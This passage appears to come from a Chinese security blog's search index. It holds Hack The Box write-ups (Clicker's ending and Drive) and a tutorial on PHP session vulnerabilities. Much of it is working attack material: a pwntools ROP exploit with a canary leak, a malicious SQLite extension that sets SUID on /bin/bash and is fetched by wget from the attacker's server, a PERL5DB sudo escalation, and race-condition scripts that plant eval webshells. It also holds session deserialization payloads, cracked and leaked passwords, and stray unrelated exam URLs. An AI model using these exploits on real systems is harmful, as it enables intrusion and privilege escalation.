ID）权限，这将使得任何用户都能以超级用户的权限运行 **/bin/bash**，这是非常危险和不安全的操作。 大概意思是在执行perl程序时开启调试，然后再调试时运行**system(&quot;chmod u+s /bin/bash&quot;);** 执行 1sudo PERL5OPT=-d PERL5DB='system(&quot;chmod u+s /bin/bash&quot;);' /opt/monitor.sh 12345678-bash-5.1$ sudo PERL5OPT=-d PERL5DB='system(&quot;chmod u+s /bin/bash&quot;);' /opt/monitor.shNo DB::DB routine defined at /usr/bin/xml_pp line 9.No DB::DB routine defined at /usr/lib/x86_64-linux-gnu/perl-base/File/Temp.pm line 870.END failed--call queue aborted.-bash-5.1$ bash -pbash-5.1# iduid=1000(jack) gid=1000(jack) euid=0(root) groups=1000(jack),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)bash-5.1# 补充升级shell命令 1script /dev/null -c++","link":"/2023/12/14/Clicker(HTB)/"},{"title":"Drive(HTB)","text":"信息搜集nmap12345678910111213141516nmap -sC -sV 10.10.11.235Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-15 14:49 CSTNmap scan report for drive.htb (10.10.11.235)Host is up (0.18s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 27:5a:9f:db:91:c3:16:e5:7d:a6:0d:6d:cb:6b:bd:4a (RSA)| 256 9d:07:6b:c8:47:28:0d:f2:9f:81:f2:b8:c3:a6:78:53 (ECDSA)|_ 256 1d:30:34:9f:79:73:69:bd:f6:67:f3:34:3c:1f:f9:4e (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Doodle Grive|_http-server-header: nginx/1.18.0 (Ubuntu)3000/tcp filtered pppService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 寻找漏洞http://drive.htb/一个注册和登陆的功能，随意注册一个账号尝试登陆 我们尝试上传两个文件并且查看， 注意查看的url一个文件似乎对应着一个ID；我们尝试从别的ID的得别的文件来泄露一些敏感文件 利用bp工具的Intruder模块来爆破； 200：表示您有权访问该文件。 401：表示对文件的访问被拒绝，这是我们主要寻找的。 500：表示没有与该特定ID关联的文件。 发现ID为79,98,99,101下有文件但是我们无权查看，通过广泛的枚举，我们发现了一个潜在的攻击载体，其形式为/block链接。值得注意的是，此链接不会验证文件的所有者，这意味着我们可能会保留我们无法访问的文件。也就是这个漏洞导致我们可以查看到其他文件 在ID为79的文件下得到了敏感信息；访问http://drive.htb/79/block/ 123456hey team after the great success of the platform we need now to continue the work.on the new features for ours platform.I have created a user for martin on the server to make the workflow easier for you please use the password &quot;Xk4@KjyrYv8t194L!&quot;.please make the necessary changes to the code before the end of the monthI will reach you soon with the token to apply your changes on the repothanks! ssh登陆 12ssh martin@10.10.11.235password:Xk4@KjyrYv8t194L! User_martinbackups在/var/www/backups目录下发现一些备份文件，下载到本地，尝试得到敏感信息； 123456789martin@drive:/var/www/backups$ pwd/var/www/backupsmartin@drive:/var/www/backups$ ls -ltotal 3732-rw-r--r-- 1 www-data www-data 13018 Sep 1 20:00 1_Dec_db_backup.sqlite3.7z-rw-r--r-- 1 www-data www-data 12226 Sep 1 20:00 1_Nov_db_backup.sqlite3.7z-rw-r--r-- 1 www-data www-data 12722 Sep 1 20:00 1_Oct_db_backup.sqlite3.7z-rw-r--r-- 1 www-data www-data 12770 Sep 1 20:00 1_Sep_db_backup.sqlite3.7z-rwxr-xr-x 1 root root 3760128 Dec 26 2022 db.sqlite3 下载到本地之后，会发现解压需要密码，并且db.sqlite3中并没有可以利用的信息 gitea下一步是搜索重要文件，果不其然存在一个gitea文件，Gitea是一个基于Go语言的开源自助Git服务，类似于GitHub或GitLab。它提供了一个轻量级的、易于安装和管理的Git服务，可以在自己的服务器上搭建私有的Git仓库。 123456789101112131415martin@drive:/usr/local/bin$ lscygdb cython cythonize django-admin gitea gunicorn pipreqs sqlformatmartin@drive:/usr/local/bin$ ./gitea2023/12/15 07:19:00 cmd/web.go:106:runWeb() [I] Starting Gitea on PID: 6652922023/12/15 07:19:00 .../setting/packages.go:44:newPackages() [E] Unable to create chunked upload directory: /usr/local/bin/data/tmp/package-upload (mkdir /usr/local/bin/data: permission denied)2023/12/15 07:19:00 ...s/install/setting.go:21:PreloadSettings() [I] AppPath: /usr/local/bin/gitea2023/12/15 07:19:00 ...s/install/setting.go:22:PreloadSettings() [I] AppWorkPath: /usr/local/bin2023/12/15 07:19:00 ...s/install/setting.go:23:PreloadSettings() [I] Custom path: /usr/local/bin/custom2023/12/15 07:19:00 ...s/install/setting.go:24:PreloadSettings() [I] Log path: /usr/local/bin/log2023/12/15 07:19:00 ...s/install/setting.go:25:PreloadSettings() [I] Configuration file: /usr/local/bin/custom/conf/app.ini2023/12/15 07:19:00 ...s/install/setting.go:26:PreloadSettings() [I] Prepare to run install page2023/12/15 07:19:01 ...s/install/setting.go:29:PreloadSettings() [I] SQLite3 is supported2023/12/15 07:19:02 cmd/web.go:217:listen() [I] [657bfde6] Listen: http://0.0.0.0:30002023/12/15 07:19:02 cmd/web.go:221:listen() [I] [657bfde6] AppURL(ROOT_URL): http://localhost:3000/2023/12/15 07:19:02 ...s/graceful/server.go:61:NewServer() [I] [657bfde6] Starting new Web server: tcp:0.0.0.0:3000 并且gitea监听3000端口；我们尝试端口转发到本地，使得本地可以访问； 执行这条命令后，当你访问localhost:3000时，实际上会建立一个SSH隧道，将流量从你的本地主机的3000端口转发到drive.htb主机的3000端口。这意味着任何发送到localhost:3000的流量都会通过SSH连接被转发到drive.htb主机上运行的服务。 因此，如果drive.htb主机上确实有一个服务在3000端口上运行，并且SSH连接也已经建立，那么当你访问localhost:3000时，你应该能够访问到drive.htb主机上对应的服务。这种方式可以让你通过SSH连接来访问远程主机上的服务，而不需要直接暴露这些服务在公共网络上。 12ssh martin@10.10.11.235 -L 3000:drive.htb:3000password:Xk4@KjyrYv8t194L! email:martin@drive.htb；password:Xk4@KjyrYv8t194L!成功登陆；只有一个仓库，在DoodleGrive/db_backup.sh下搜集到到了解压文件的密码：H@ckThisP@ssW0rDIfY0uC@n:) 12345678910111213#!/bin/bashDB=$1date_str=$(date +'%d_%b')7z a -p'H@ckThisP@ssW0rDIfY0uC@n:)' /var/www/backups/${date_str}_db_backup.sqlite3.7z db.sqlite3cd /var/www/backups/ls -l --sort=t *.7z &gt; backups_num.tmpbackups_num=$(cat backups_num.tmp | wc -l)if [[ $backups_num -gt 10 ]]; then #backups is more than 10... deleting to oldest backup rm $(ls *.7z --sort=t --color=never | tail -1) #oldest backup deleted successfully!firm backups_num.tmp 解压文件7z解压 1237z x 1_Nov_db_backup.sqlite3.7z -oname_Nov7z x 1_Oct_db_backup.sqlite3.7z -oname_Oct...... hashcat破解密码，密码不止一个，枚举尝试得到了正确passwd:johnmayer7 1234567hashcat -m 124 -a 0 --force -O tests /usr/share/wordlists/rockyou.txthashcat tests --show sha1$Ri2bP6RVoZD5XYGzeYWr7c$71eb1093e10d8f7f4d1eb64fa604e6050f8ad141:johniscoolsha1$kyvDtANaFByRUMNSXhjvMc$9e77fb56c31e7ff032f8deb1f0b5e8f42e9e3004:john316sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a:johnmayer7sha1$DhWa3Bym5bj9Ig73wYZRls$3ecc0c96b090dea7dfa0684b9a1521349170fc93:john boy User_tom12ssh tom@10.10.11.235passwd:johnmayer7 代码分析12find / -perm -4000 2&gt;/dev/null/home/tom/doodleGrive-cli 将文件下载到本地查看； main函数存在格式字符串漏洞+栈溢出 1234567891011121314151617181920212223242526272829303132333435363738int __cdecl main(int argc, const char **argv, const char **envp){ int v3; // edx int v4; // ecx int v5; // r8d int v6; // r9d int v7; // edx int v8; // ecx int v9; // r8d int v10; // r9d char v12[16]; // [rsp+0h] [rbp-50h] BYREF char v13[56]; // [rsp+10h] [rbp-40h] BYREF unsigned __int64 v14; // [rsp+48h] [rbp-8h] v14 = __readfsqword(0x28u); setenv(&quot;PATH&quot;, &amp;unk_4973A8, 1LL); setuid(0LL); setgid(0LL); puts(&quot;[!]Caution this tool still in the development phase...please report any issue to the development team[!]&quot;); puts(&quot;Enter Username:&quot;); fgets(v12, 16LL, stdin); sanitize_string(v12); printf(&quot;Enter password for &quot;, 16, v3, v4, v5, v6, v12[0]); printf(v12, 16, v7, v8, v9, v10, v12[0]); puts(&quot;:&quot;); fgets(v13, 400LL, stdin); sanitize_string(v13); if ( j_strcmp_ifunc(v12, &quot;moriarty&quot;) || j_strcmp_ifunc(v13, &quot;findMeIfY0uC@nMr.Holmz!&quot;) ) { puts(&quot;Invalid username or password.&quot;); } else { puts(&quot;Welcome...!&quot;); main_menu(); } return 0;} main_menu()函数是一些执行sqlite3的一些功能 123456789101112131415161718192021222324 switch ( v6[0] ) { case '1': show_users_list(); break; case '2': show_groups_list(); break; case '3': show_server_status(); break; case '4': show_server_log(); break; case '5': activate_user_account(); break; case '6': puts(&quot;exiting...&quot;); exit(0LL); default: puts(&quot;please Select a valid option...&quot;); break;} 其中activate_user_account函数存在sql注入 12345678910111213141516171819202122printf(&quot;Enter username to activate account: &quot;, a2, a3, a4, a5, a6, v13[0]);fgets(v13, 40LL, stdin);v13[j_strcspn_ifunc(v13, &quot;\\n&quot;)] = 0;if ( v13[0] ){ sanitize_string(v13); snprintf( v14, 250, &quot;/usr/bin/sqlite3 /var/www/DoodleGrive/db.sqlite3 -line 'UPDATE accounts_customuser SET is_active=1 WHERE username=\\&quot;%s\\&quot;;'&quot;, v13, v6, v7, v13[0]); printf(&quot;Activating account for user '%s'...\\n&quot;, v13, v8, v9, v10, v11, v13[0]); system(v14);}else{ puts(&quot;Error: Username cannot be empty.&quot;);} 提权方法一(bof+printf)尝试利用二进制文件漏洞提权; 这道题我自己写了个exp，本地可以成功，我想去靶场机对外开一个端口服务，使我攻击机可以nc到靶场机运行这个有漏洞的二进制文件，但是我发现这个二进制文件没有刷新缓冲区原因等，导致这种办法用不了；我直接把我的exp放到靶机上，有缺少一些python的库；最终利用python的ssh技术得到远程机的一个进程提权成功 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *context(os='linux',arch='amd64',log_level='debug')filename = &quot;doodleGrive-cli&quot;#p = process(filename)elf = ELF(filename)ssh_host = 'drive.htb'ssh_user = 'tom'ssh_pass = 'johnmayer7'ssh_port = 22sh = ssh(host=ssh_host, user=ssh_user, password=ssh_pass, port=ssh_port)p = sh.run('./doodleGrive-cli')pop_rax = 0x0000000000453e37pop_rdi = 0x0000000000401912pop_rsi = 0x000000000040f74epop_rdx = 0x000000000040181fret = 0x000000000040101asyscall = 0x00000000004012d3binsh = 0x497CD5#Canary ==&gt; %15$pp.sendlineafter(&quot;Enter Username:\\n&quot;,b&quot;%15$p&quot;)p.recvuntil('Enter password for ')Canary = int(p.recv(18),16)print(hex(Canary))payload = b&quot;a&quot;*0x38+p64(Canary)+b&quot;deadbeef&quot;+p64(pop_rax)+p64(0x3b)+p64(pop_rdi)+p64(binsh)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(syscall)p.sendlineafter(&quot;:\\n&quot;,payload)p.interactive() 方法二(load_extension)一开始我想尝试利用文件读取函数来得到/root/root.txt,遗憾的是我并没有搜索到sqllie3的文件读取函数的有关信息； 利用SQLite3中的load_extension函数。你可以在这里查看更多关于它的信息：SQLite3 load_extension。 经过广泛的测试后，我们注意到应用程序过滤掉了字符“ ”。和“/”，最大输入长度为40个字符。为了绕过第一个限制，我们可以使用char()函数将文本写成ASCII。对于第二个限制，我们需要将文件压缩到只有一个字符以节省空间 创建一个恶意文件a.c;记住，文件名应该只包含一个字符，初始化函数应该遵循以下格式：sqlite3_&lt;filename&gt;_init()(也就是filename要与load_extension函数中的文件名要一致才行)。 1234567#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void sqlite3_a_init() {setuid(0);setgid(0);system(&quot;/usr/bin/chmod +s /bin/bash&quot;);} 编译代码 1gcc -shared a.c -o a.so -nostartfiles -fPIC 开启python服务 1python3 -m http.server 在靶机下载恶意文件并实时攻击得到root 123456789101112131415161718192021222324252627tom@drive:~$ wget 10.10.16.13:8000/a.sotom@drive:~$ mv a.so atom@drive:~$ ./doodleGrive-cli [!]Caution this tool still in the development phase...please report any issue to the development team[!]Enter Username:moriartyEnter password for moriarty:findMeIfY0uC@nMr.Holmz!Welcome...!doodleGrive cli beta-2.2: 1. Show users list and info2. Show groups list3. Check server health and status4. Show server requests log (last 1000 request)5. activate user account6. ExitSelect option: 5 Enter username to activate account: &quot;+load_extension(char(46,47,97))--+Activating account for user '&quot;+load_extension(char(46,47,97))--+'...tom@drive:~$ ls -l /bin/bash-rwsr-sr-x 1 root root 1183448 Apr 18 2022 /bin/bashtom@drive:~$ bash -pbash-5.0# whoamiroot","link":"/2023/12/15/Drive(HTB)/"},{"title":"session相关漏洞","text":"session什么是session官方Session定义：在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。主要有以下特点： sessin保存的位置是在服务器端session通常是要配合cookie使用因为HTTP的无状态性，服务端产生了session来标识当前的用户状态 本质上，session就是一种可以维持服务器端的数据存储技术。即session技术就是一种基于后端有别于数据库的临时存储数据的技术 session.upload_progress我先从头到尾分析一下利用session.upload_progress进行文件包含 相关配置在讲该姿势的具体利用方法之前，要先讲几个 php.ini 中的相关配置，这也是利用该方式进行文件包含的前提，此特性自 PHP 5.4.0 后可用。 123456session.auto_start = offsession.upload_progress.enabled = onsession.upload_progress.cleanup = onsession.upload_progress.prefix = &quot;upload_progress_&quot;session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;session.save_path= &quot;/var/lib/php/sessions&quot; 1234567enabled=on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；cleanup=on表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；prefix+name将表示为session中的键名 当 session.upload_progress.enabledINI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态 当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix与 session.upload_progress.name连接在一起的值。 通常这些键值可以通过读取INI设置来获得，例如 1234&lt;?php$key = ini_get(&quot;session.upload_progress.prefix&quot;) . ini_get(&quot;session.upload_progress.name&quot;);var_dump($_SESSION[$key]);?&gt; 存储机制当开启session时，服务器都会在一个临时目录下创建一个session文件来保存会话信息，文件名格式为 sess_PHPSESSID 。在linux系统中，session文件一般保存在以下几个目录：以session.save_path为依据 1234/var/lib/php//var/lib/php/sessions//tmp//tmp/sessions/ 分析问题一代码里没有session_start(),如何创建session文件呢。 其实，如果session.auto_start=On ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。 但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=zixyd，PHP将会在服务器上创建一个文件：sess_zixyd。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_zixyd。 问题二但是问题来了，默认配置session.upload_progress.cleanup = on导致文件上传后，session文件内容立即清空， 需要条件竞争 实验一在kali中开启nginx;并创建index.php文件内容如下: 1234567891011&lt;?phphighlight_file(__FILE__);session_start();if($_POST['zixyd']){ include $_POST['zixyd'];}phpinfo();?&gt; 使用了session_start函数，并且存在任意文件包含漏洞，但是服务器上却没有恶意的文件包含可以getwebshell时，这时可以利用session.upload_progress 方法一(bp)创建一个可以上传文件的html文件 123456789&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://192.168.6.98/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;1&lt;?php cat('cat /flag.txt');?&gt;&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 随便上传一个文件并抓包发送到intruder模块，注意是随便上传一个文件,这里我们只需要利用在文件上传时PHP_SESSION_UPLOAD_PROGRESS和Cookie中PHPSESSID的值,而和上传什么文件无关，这个包是为了条件竞争制作恶意文件的 123456789101112131415161718192021222324252627POST /index.php HTTP/1.1Host: 192.168.6.98User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Cookie: PHPSESSID=zixydAccept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------32681549875692968181236391716Content-Length: 4686Origin: nullConnection: closeUpgrade-Insecure-Requests: 1-----------------------------32681549875692968181236391716Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;§1§&lt;?php system('cat /flag.txt');?&gt;-----------------------------32681549875692968181236391716Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.md&quot;Content-Type: application/octet-stream```https://www.cisp.cn/xe.exam.question_detail/1.0.0?exam_id=ex_658291545c15c_ANrAAwOo&amp;uexam_id=uexam_6597ca52a0682_TvyRy60JZl&amp;qid=qs_6164e344c32cb_ORWtGGSc0A92https://www.cisp.cn/xe.exam.question_detail/1.0.0?exam_id=ex_658291545c15c_ANrAAwOo&amp;uexam_id=uexam_6597ca52a0682_TvyRy60JZl&amp;qid=qs_6164e344c33f5_FmQaeCt30A88``` 再抓一个包发送到intruder模块，这个包存在任意文件包含漏洞，是为了包含恶意文件的 123456789101112131415POST / HTTP/1.1Host: 192.168.6.98User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 48Origin: http://192.168.6.98Connection: closeReferer: http://192.168.6.98/Cookie: PHPSESSID=rou5qd86se828i5on12sl79fp6Upgrade-Insecure-Requests: 1zixyd=%2Fvar%2Flib%2Fphp%2Fsessions%2Fsess_zixyd&amp;haha=§1§ 成功 方法二(python)12345678910111213141516171819202122232425262728293031323334353637383940414243# -*- encoding:utf-8 -*-import ioimport threadingimport requestsurl = &quot;http://192.168.6.98/&quot;sessid = 'zixyd'def write(session): filebytes = io.BytesIO(b'a'*1024*50) while True: session.post(url=url,data = { 'PHP_SESSION_UPLOAD_PROGRESS': '&lt;?php eval($_POST[2]);?&gt;' },cookies={ 'PHPSESSID':sessid },files={ 'file': ('zixyd.jpg',filebytes) })def read(session): while True: res1 = session.post(url=url, data={ 'zixyd': r&quot;/var/lib/php/sessions/sess_&quot;+ sessid, '2': r&quot;system('cat /flag.txt');&quot; }) if 'flag' in res1.text: print(res1.text.encode('gbk','ignore').decode('gbk')) # else: # print(&quot;retry~~~~&quot;)if __name__ == '__main__': with requests.session() as session: for i in range(20): threading.Thread(target=write,args=(session,)).start() for i in range(20): threading.Thread(target=read,args=(session,)).start() 输出如下：可以很明显的看到是由“upload_progress_”和&lt;?php eval($_POST[2]);?&gt;为键值，|后面的就是session中存储的上传进度时的信息；只不过&lt;?php eval($_POST[2]);?&gt;已经被php解析了变成了flag{this is fuck flag}，这里也可以看出另一点：session.serialize_handler = php,这与session产生反序列漏洞有关 12upload_progress_flag{this is fuck flag}|a:5:{s:10:&quot;start_time&quot;;i:1704606442;s:14:&quot;content_length&quot;;i:51477;s:15:&quot;bytes_processed&quot;;i:5250;s:4:&quot;done&quot;;b:0;s:5:&quot;files&quot;;a:1:{i:0;a:7:{s:10:&quot;field_name&quot;;s:4:&quot;file&quot;;s:4:&quot;name&quot;;s:9:&quot;zixyd.jpg&quot;;s:8:&quot;tmp_name&quot;;N;s:5:&quot;error&quot;;i:0;s:4:&quot;done&quot;;b:0;s:10:&quot;start_time&quot;;i:1704606442;s:15:&quot;bytes_processed&quot;;i:5250;}}} session_unserPHP session序列化机制根据php.ini中的配置项，我们研究将$_SESSION中保存的所有数据序列化存储到PHPSESSID对应的文件中，使用的三种不同的处理格式，即session.serialize_handler定义的三种引擎： 处理器 php 键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值 php_binary 键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值 php_serialize (php&gt;=5.5.4) 经过 serialize() 函数反序列处理的数组 php处理器这里为了加深说明除了session_start函数，还可以用session.auto_start配置，我接下来的使用将不使用函数，而是更改配置;（这样改配置本来没有问题，但是这样改配置达不到看处理器不同而存储的序列化数据不同，听不懂？ 下面会说明） 我的实验环境是：kali+nginx+fpm 123456789101112131415┌──(kali㉿kali)-[~]└─$ sudo find / -name php.ini /var/lib/docker/overlay2/6caa6f28e81c757ee588fab97a4e7c7cad8bd0fe73be2dbee11c82589c664d06/diff/etc/php5/apache2/php.ini/var/lib/docker/overlay2/6caa6f28e81c757ee588fab97a4e7c7cad8bd0fe73be2dbee11c82589c664d06/diff/etc/php5/cli/php.ini/etc/php/8.2/apache2/php.ini/etc/php/8.2/cli/php.ini/etc/php/8.2/fpm/php.ini┌──(kali㉿kali)-[~]└─$ sudo vim /etc/php/8.2/fpm/php.ini修改： session.auto_start = 1重启fpm服务使得php.ini生效┌──(kali㉿kali)-[~]└─$ systemctl restart php8.2-fpm.service 测试代码 1234567&lt;?phphighlight_file(__FILE__);$_SESSION['name'] = $_GET['name'];echo $_SESSION['name'];?&gt; 这里可以看到，未使用session_start函数;Cookie却存在PHPSESSID 来看看php处理器将数据序列化的形式 1234567891011121314┌──(root㉿kali)-[/var/lib/php/sessions]└─# pwd /var/lib/php/sessions ┌──(root㉿kali)-[/var/lib/php/sessions]└─# ls -al总计 772drwx-wx-wt 2 root root 778240 1月 7日 14:25 .drwxr-xr-x 4 root root 4096 2023年 4月 5日 ..-rw------- 1 www-data www-data 17 1月 7日 14:25 sess_bb95aoqqkmvq2ltbpcdlu16hvh ┌──(root㉿kali)-[/var/lib/php/sessions]└─# cat sess_bb95aoqqkmvq2ltbpcdlu16hvh name|s:5:&quot;zixyd&quot;; php_serialize处理器12345678910&lt;?phphighlight_file(__FILE__);ini_set('session.serialize_handler','php_serialize');$_SESSION['name'] = $_GET['name'];echo $_SESSION['name'];?&gt; 这里我已经将session.serialize_handler改成了php_serialize 但是数据函数以php处理器方式存储的；经过排查找到原因：ini_set('session.serialize_handler','php_serialize');只对当前文件的session_start函数有效；而对php.ini中的配置无效， 1234567891011┌──(root㉿kali)-[/var/lib/php/sessions]└─# ls -al总计 776drwx-wx-wt 2 root root 778240 1月 7日 14:40 .drwxr-xr-x 4 root root 4096 2023年 4月 5日 ..-rw------- 1 www-data www-data 17 1月 7日 14:25 sess_bb95aoqqkmvq2ltbpcdlu16hvh-rw------- 1 www-data www-data 17 1月 7日 14:40 sess_mekil2i1boqaof0g4rohu4ef8p ┌──(root㉿kali)-[/var/lib/php/sessions]└─# cat sess_mekil2i1boqaof0g4rohu4ef8pname|s:5:&quot;zixyd&quot;; 所以我又将php.ini中的session.auto改回了0，并在文件中添加session_start(); 123┌──(root㉿kali)-[/var/lib/php/sessions]└─# cat sess_6bf6o57tcu6h8735crmc0845e1a:1:{s:4:&quot;name&quot;;s:5:&quot;zixyd&quot;;} 12php: name|s:5:&quot;zixyd&quot;; php_serialize: a:1:{s:4:&quot;name&quot;;s:5:&quot;zixyd&quot;;} session的反序列化漏洞利用session的反序列化漏洞，就是利用php处理器和php_serialize处理器的存储格式差异而产生，通过具体的代码我们来看下漏洞出现的原因 实验一创建一个test.php，使用php_serialize处理器； 123456789&lt;?phphighlight_file(__FILE__);ini_set('session.serialize_handler','php_serialize');session_start();$_SESSION['zixyd'] = $_GET['zixyd'];echo $_SESSION['zixyd'];?&gt; 创建一个shell.php，默认使用php处理器 123456789101112131415&lt;?phphighlight_file(__FILE__); session_start();class shell{ public $name; function __wakeup(){ echo &quot;success&quot;; } function __destruct(){ eval($this-&gt;name); }}$test = new shell();?&gt; 123456789&lt;?phpclass shell{ public $name;}$a = new shell();$a-&gt;name = &quot;phpinfo();&quot;;echo serialize($a);?&gt;//O:5:&quot;shell&quot;:1:{s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;} 将|O:5:&quot;shell&quot;:1:{s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;}url编码；访问test.php；将恶意数据存储到session文件中 1http://192.168.6.98/test.php?zixyd=%7CO%3A5%3A%22shell%22%3A1%3A%7Bs%3A4%3A%22name%22%3Bs%3A10%3A%22phpinfo()%3B%22%3B%7D 123┌──(root㉿kali)-[/var/lib/php/sessions]└─# cat sess_6bf6o57tcu6h8735crmc0845e1a:1:{s:5:&quot;zixyd&quot;;s:46:&quot;|O:5:&quot;shell&quot;:1:{s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;}&quot;;} 可以看到恶意数据已经成功存储到了session文件，直接访问shell.php即可执行phpinfo php处理器会以|作为分隔符，将O:5:&quot;shell&quot;:1:{s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;}反序列化，就会触发__wakeup()方法，最后对象销毁执行__destruct()方法中的eval()函数 实验二创建一个test2.php文件内容如下： 12345678910111213141516171819202122232425&lt;?phpini_set('session.serialize_handler', 'php');session_start();class zixyd{ public $mdzz; function __construct() { $this-&gt;mdzz = 'phpinfo();'; } function __destruct() { eval($this-&gt;mdzz); }}if(isset($_GET['phpinfo'])){ $m = new zixyd();}else{ highlight_file(__FILE__);}?&gt; 查看phpinfo 1http://web.jarvisoj.com:32784/index.php?phpinfo=1 从phpinfo中寻找重要信息如下： Directive Local Value Master Value session.auto_start Off Off session.save_path /var/lib/php/sessions /var/lib/php/sessions session.serialize_handler php php_serialize session.upload_progress.enabled on on session.upload_progress.cleanup Off Off session.upload_progress.name PHP_SESSION_UPLOAD_PROGRESS PHP_SESSION_UPLOAD_PROGRESS session.upload_progress.prefix upload_progress_ upload_progress_ session.use_strict_mode Off Off 可见php.ini中session.serialize_handler = php_serialize，当前目录中被设置为session.serialize_handler = php，因此存在session反序列化利用的条件 12local value(局部变量：作用于当前目录程序，会覆盖master value内容):phpmaster value(主变量：php.ini里面的内容):php_serialize 那么我们如何找到代码入口将利用代码写入到session文件？想要写入session文件就得想办法在$_SESSION变量中增加我们可控的输入点，这里可以利用session.upload_progress,因为这样的话session.upload_progress.name 和filename的值都可控制； 123456789101112&lt;?phpclass zixyd{ public $mdzz;}$a = new zixyd();$a-&gt;mdzz = 'system(&quot;id&quot;);';echo serialize($a);?&gt; //O:5:&quot;zixyd&quot;:1:{s:4:&quot;mdzz&quot;;s:13:&quot;system(&quot;id&quot;);&quot;;} 还是利用那个文件上传的html文件 123456789&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://192.168.6.98/test2.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;1&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 这里有个奇怪的点就是：我将session.upload_progress.cleanup 关了，但依然没有用，文件上传的信息依然没有，最终还是利用条件竞争 |O:5:&quot;zixyd&quot;:1:{s:4:&quot;mdzz&quot;;s:13:&quot;system(&quot;id&quot;);&quot;;}注意这里有一个|，这里可以把payload放到session.upload_progress.name 和filename都是可以的 123456789101112131415161718192021222324POST /test2.php HTTP/1.1Host: 192.168.6.98User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------8126225181410704334410916334Content-Length: 361Origin: nullConnection: closeCookie: PHPSESSID=ir85hm42ah4mln0ko3svp355ciUpgrade-Insecure-Requests: 1-----------------------------8126225181410704334410916334Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;§1§|O:5:&quot;zixyd&quot;:1:{s:4:&quot;mdzz&quot;;s:13:&quot;system(&quot;id&quot;);&quot;;}-----------------------------8126225181410704334410916334Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.md&quot;Content-Type: application/octet-stream1-----------------------------8126225181410704334410916334-- 123456789101112GET /test2.php HTTP/1.1Host: 192.168.6.98User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0Accept: 